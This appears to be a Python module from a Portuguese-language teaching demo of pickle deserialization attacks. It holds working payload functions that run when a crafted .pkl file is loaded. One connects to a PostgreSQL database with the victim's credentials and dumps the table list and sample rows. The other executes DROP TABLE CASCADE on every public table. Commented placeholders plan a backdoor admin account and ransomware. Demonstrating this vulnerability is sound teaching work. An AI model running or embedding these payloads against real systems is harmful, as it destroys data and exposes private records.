# ==============================================================
# comandos/__init__.py — Módulo de payloads de ataque
# Projeto: Demonstração de Pickle Deserialization Attack (A08:2021)
#
# Este módulo contém as funções que serão injetadas no .pkl
# malicioso e executadas quando a vítima fizer pickle.load().
# ==============================================================

import sys
import time

import psycopg2

# ── Cores ANSI ──
RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
DIM     = "\033[2m"


def _digitar(texto, delay=0.02):
    """Efeito de digitação."""
    for char in texto:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()


def _barra(descricao, duracao=1.5, etapas=20):
    """Barra de progresso animada."""
    sys.stdout.write(f"  {RED}[{descricao}]{RESET} [")
    sys.stdout.flush()
    for i in range(etapas):
        time.sleep(duracao / etapas)
        sys.stdout.write(f"{RED}█{RESET}")
        sys.stdout.flush()
    print(f"] {RED}OK{RESET}")


def exfiltrar_tabelas(host, port, dbname, user, password):
    """
    Payload de exfiltração: conecta no BD e lista todas as tabelas.
    Esta função é chamada automaticamente pelo pickle.load() quando
    o arquivo .pkl infectado é desserializado.
    """

    # ─── Alerta de execução do payload ───
    time.sleep(0.5)
    print()
    print(f"{RED}{'═' * 70}{RESET}")
    print(f"{RED}  🦠  PAYLOAD MALICIOSO EXECUTADO!{RESET}")
    print(f"{RED}{'═' * 70}{RESET}")
    print()
    time.sleep(1.0)

    _digitar(f"  {RED}[ATAQUE]{RESET} O pickle.load() acionou o método __reduce__!", delay=0.02)
    time.sleep(0.5)
    _digitar(f"  {RED}[ATAQUE]{RESET} Código malicioso está sendo executado agora...", delay=0.02)
    print()
    time.sleep(1.0)

    # ─── Fase 1: Conexão ao servidor ───
    print(f"  {RED}▸ Fase 1:{RESET} Conectando no servidor de banco de dados...")
    print(f"  {DIM}         Alvo: {host}:{port}/{dbname}{RESET}")
    print()

    _barra("Conectando ao BD", duracao=1.5)

    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user,
            password=password,
        )
        cursor = conn.cursor()

        time.sleep(0.5)
        print(f"  {RED}[OK]{RESET} Conexão estabelecida com credenciais da vítima!")
        print()
        time.sleep(1.0)

        # ─── Fase 2: Mapeamento de tabelas ───
        print(f"  {RED}▸ Fase 2:{RESET} Mapeando todas as tabelas do banco...")
        print()

        _barra("Exfiltrando schema", duracao=1.5)
        time.sleep(0.5)

        cursor.execute("""
            SELECT table_schema, table_name
            FROM information_schema.tables
            WHERE table_schema NOT IN ('pg_catalog', 'information_schema')
            ORDER BY table_schema, table_name;
        """)
        tabelas = cursor.fetchall()

        print()
        print(f"  {RED}  ┌──────────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │       📋  TABELAS EXFILTRADAS DO SERVIDOR            │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────────┤{RESET}")

        if tabelas:
            for schema, table in tabelas:
                time.sleep(0.4)
                print(f"  {RED}  │{RESET}  📋 {BOLD}{schema}.{table}{RESET}")
        else:
            print(f"  {RED}  │{RESET}  (nenhuma tabela encontrada)")

        print(f"  {RED}  └──────────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Fase 3: Exfiltrar dados de cada tabela ───
        print(f"  {RED}▸ Fase 3:{RESET} Exfiltrando dados de cada tabela...")
        print()

        for schema, table in tabelas:
            full_name = f"{schema}.{table}"
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {full_name}")
                count = cursor.fetchone()[0]
                if count > 0:
                    time.sleep(0.5)
                    _barra(f"Roubando {full_name}", duracao=1.0, etapas=15)

                    print(f"  {YELLOW}  [{full_name}] {count} registro(s) encontrado(s){RESET}")

                    cursor.execute(f"SELECT * FROM {full_name} LIMIT 3")
                    colunas = [desc[0] for desc in cursor.description]
                    registros = cursor.fetchall()

                    print(f"  {DIM}  Colunas: {', '.join(colunas)}{RESET}")
                    for reg in registros:
                        time.sleep(0.3)
                        # Formatar cada campo para exibição
                        campos = []
                        for i, val in enumerate(reg):
                            val_str = str(val)
                            if len(val_str) > 40:
                                val_str = val_str[:40] + "..."
                            campos.append(f"{colunas[i]}={val_str}")
                        print(f"  {RED}  → {', '.join(campos[:4])}{RESET}")
                    print()
            except Exception:
                pass  # Ignora tabelas sem permissão

        time.sleep(1.0)

        # ─── Resumo do ataque ───
        print(f"  {RED}{'─' * 58}{RESET}")
        print()
        print(f"  {RED}  ⚠️  EXFILTRAÇÃO CONCLUÍDA!{RESET}")
        print(f"  {RED}  O atacante agora possui:{RESET}")
        time.sleep(0.5)
        print(f"  {RED}    • Mapeamento completo de todas as tabelas{RESET}")
        time.sleep(0.3)
        print(f"  {RED}    • Amostra de dados de cada tabela{RESET}")
        time.sleep(0.3)
        print(f"  {RED}    • Credenciais de acesso ao servidor{RESET}")
        print()
        time.sleep(0.5)
        print(f"  {YELLOW}  Próximos passos do atacante:{RESET}")
        time.sleep(0.3)
        print(f"  {YELLOW}    → DROP TABLE (destruição de dados){RESET}")
        time.sleep(0.3)
        print(f"  {YELLOW}    → INSERT de backdoor (persistência){RESET}")
        time.sleep(0.3)
        print(f"  {YELLOW}    → Ransomware (criptografia + resgate){RESET}")
        print()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"  {RED}[ERRO] Falha na conexão com o servidor: {e}{RESET}")

    # Retorna um dict fake para que o pickle.load não quebre
    return {
        "status": "COMPROMETIDO",
        "mensagem": "Sessão infectada — dados exfiltrados com sucesso",
        "usuario": "ATACANTE",
        "database": dbname,
        "timestamp_login": "COMPROMETIDO",
        "ip_servidor": f"{host}:{port}",
    }


def dropar_tabela(host, port, dbname, user, password):
    """
    Payload destrutivo: conecta no BD e executa DROP TABLE em
    todas as tabelas do schema público. Mostra o antes/depois.
    """

    time.sleep(0.5)
    print()
    print(f"{RED}{'═' * 70}{RESET}")
    print(f"{RED}  💀  PAYLOAD DESTRUTIVO EXECUTADO — DROP TABLE{RESET}")
    print(f"{RED}{'═' * 70}{RESET}")
    print()
    time.sleep(1.0)

    _digitar(f"  {RED}[ATAQUE]{RESET} O pickle.load() acionou o método __reduce__!", delay=0.02)
    time.sleep(0.5)
    _digitar(f"  {RED}[ATAQUE]{RESET} Payload de DESTRUIÇÃO DE DADOS em execução...", delay=0.02)
    print()
    time.sleep(1.0)

    # ─── Fase 1: Conexão ───
    print(f"  {RED}▸ Fase 1:{RESET} Conectando no servidor de banco de dados...")
    print(f"  {DIM}         Alvo: {host}:{port}/{dbname}{RESET}")
    print()

    _barra("Conectando ao BD", duracao=1.5)

    try:
        conn = psycopg2.connect(
            host=host,
            port=port,
            dbname=dbname,
            user=user,
            password=password,
        )
        conn.autocommit = True  # DROP TABLE precisa de autocommit
        cursor = conn.cursor()

        time.sleep(0.5)
        print(f"  {RED}[OK]{RESET} Conexão estabelecida!")
        print()
        time.sleep(1.0)

        # ─── Fase 2: Listar tabelas ANTES da destruição ───
        print(f"  {RED}▸ Fase 2:{RESET} Mapeando tabelas existentes (ANTES da destruição)...")
        print()

        _barra("Mapeando schema", duracao=1.0)

        cursor.execute("""
            SELECT table_name
            FROM information_schema.tables
            WHERE table_schema = 'public'
            ORDER BY table_name;
        """)
        tabelas_antes = [row[0] for row in cursor.fetchall()]

        print()
        print(f"  {CYAN}  ┌──────────────────────────────────────────────────┐{RESET}")
        print(f"  {CYAN}  │   📋  TABELAS ENCONTRADAS (ANTES)                │{RESET}")
        print(f"  {CYAN}  ├──────────────────────────────────────────────────┤{RESET}")
        for tabela in tabelas_antes:
            time.sleep(0.3)
            # Contar registros
            try:
                cursor.execute(f"SELECT COUNT(*) FROM {tabela}")
                count = cursor.fetchone()[0]
                print(f"  {CYAN}  │{RESET}  📋 {BOLD}{tabela}{RESET} ({count} registros)")
            except Exception:
                print(f"  {CYAN}  │{RESET}  📋 {BOLD}{tabela}{RESET}")
        print(f"  {CYAN}  └──────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Fase 3: DROP TABLE em cascata ───
        print(f"  {RED}▸ Fase 3:{RESET} Executando {BOLD}DROP TABLE CASCADE{RESET} em todas as tabelas...")
        print()
        time.sleep(0.5)

        tabelas_dropadas = []
        for tabela in tabelas_antes:
            time.sleep(0.5)
            print(f"  {DIM}  SQL > DROP TABLE IF EXISTS {tabela} CASCADE;{RESET}")
            time.sleep(0.3)

            try:
                cursor.execute(f"DROP TABLE IF EXISTS {tabela} CASCADE;")
                tabelas_dropadas.append(tabela)
                print(f"  {RED}  💀 DESTRUÍDA: {BOLD}{tabela}{RESET}")
            except Exception as e:
                print(f"  {YELLOW}  ⚠️ Falha ao dropar {tabela}: {e}{RESET}")
            time.sleep(0.3)

        print()
        _barra("Destruindo dados", duracao=2.0)
        print()
        time.sleep(1.0)

        # ─── Fase 4: Verificar DEPOIS ───
        print(f"  {RED}▸ Fase 4:{RESET} Verificando estado do banco DEPOIS da destruição...")
        print()

        cursor.execute("""
            SELECT table_name
            FROM information_schema.tables
            WHERE table_schema = 'public'
            ORDER BY table_name;
        """)
        tabelas_depois = [row[0] for row in cursor.fetchall()]

        print(f"  {RED}  ┌──────────────────────────────────────────────────┐{RESET}")
        print(f"  {RED}  │   💀  RESULTADO FINAL                            │{RESET}")
        print(f"  {RED}  ├──────────────────────────────────────────────────┤{RESET}")
        print(f"  {RED}  │{RESET}  Tabelas ANTES:   {BOLD}{len(tabelas_antes)}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  Tabelas DEPOIS:  {BOLD}{len(tabelas_depois)}{RESET}")
        time.sleep(0.3)
        print(f"  {RED}  │{RESET}  Tabelas DESTRUÍDAS: {BOLD}{len(tabelas_dropadas)}{RESET}")
        time.sleep(0.3)
        for t in tabelas_dropadas:
            print(f"  {RED}  │{RESET}    💀 {t}")
            time.sleep(0.2)
        print(f"  {RED}  └──────────────────────────────────────────────────┘{RESET}")
        print()
        time.sleep(1.0)

        # ─── Resumo ───
        print(f"  {RED}  ⚠️  DESTRUIÇÃO CONCLUÍDA!{RESET}")
        time.sleep(0.5)
        _digitar(f"  {RED}  Todos os dados do servidor foram permanentemente apagados.{RESET}", delay=0.02)
        time.sleep(0.3)
        _digitar(f"  {RED}  Usuários, clientes, transações, configurações — TUDO PERDIDO.{RESET}", delay=0.02)
        time.sleep(0.3)
        _digitar(f"  {YELLOW}  E tudo isso aconteceu porque a vítima fez pickle.load()...{RESET}", delay=0.02)
        print()

        cursor.close()
        conn.close()

    except Exception as e:
        print(f"  {RED}[ERRO] Falha na conexão com o servidor: {e}{RESET}")

    # Retorna um dict fake para que o pickle.load não quebre
    return {
        "status": "COMPROMETIDO",
        "mensagem": "DADOS DESTRUÍDOS — DROP TABLE executado com sucesso",
        "usuario": "ATACANTE",
        "database": dbname,
        "timestamp_login": "DESTRUÍDO",
        "ip_servidor": f"{host}:{port}",
    }


# ──────────────────────────────────────────────────────────
# PLACEHOLDER para comandos futuros:
#
# def inserir_backdoor(host, port, dbname, user, password):
#     """Payload de persistência: insere usuário admin no BD"""
#     ...
#
# def ransomware_simulado(host, port, dbname, user, password):
#     """Payload de ransomware: criptografa dados e exige resgate"""
#     ...
# ──────────────────────────────────────────────────────────
